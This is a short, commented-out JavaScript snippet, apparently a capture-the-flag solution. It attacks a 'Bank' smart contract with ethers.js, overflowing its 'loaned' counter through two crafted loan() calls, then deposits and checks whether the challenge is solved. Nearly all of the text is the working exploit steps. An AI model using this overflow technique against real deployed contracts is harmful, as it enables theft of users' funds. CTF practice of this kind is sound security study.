
// --- A snippet of the exploit code ---

// let bank: Bank

// // Load the contract from an address if we are running against CTF network
// // If not, deploy it for testing locally (hardhat network)
// if (network.name == "ctf") {
//     bank = await ethers.getContractAt("Bank", ensureEnvVar("CONTRACT_ADDRESS"))
// } else {
//     bank = await(await ethers.getContractFactory("Bank", { signer: (await ethers.getSigners())[1] })).deploy()
// }
// await bank.waitForDeployment();

// // ***********************************************************
// // Do stuff here
// console.log("Exploit started");

// console.log(await ethers.provider.getBalance(bank));
// console.log(await ethers.provider.getBalance(account));

// // overflow "loaned"

// await bank.loan(281474976710655n, { gasPrice: 672839309n });
// await bank.loan(1n, { gasPrice: 672839309n });

// console.log(await ethers.provider.getBalance(bank));
// console.log(await ethers.provider.getBalance(account));

// // deposit
// console.log(await bank.deposit(281474976710655n, { value: 281474976710655n, gasPrice: 672839309n }));

// console.log(await bank.isChallSolved());
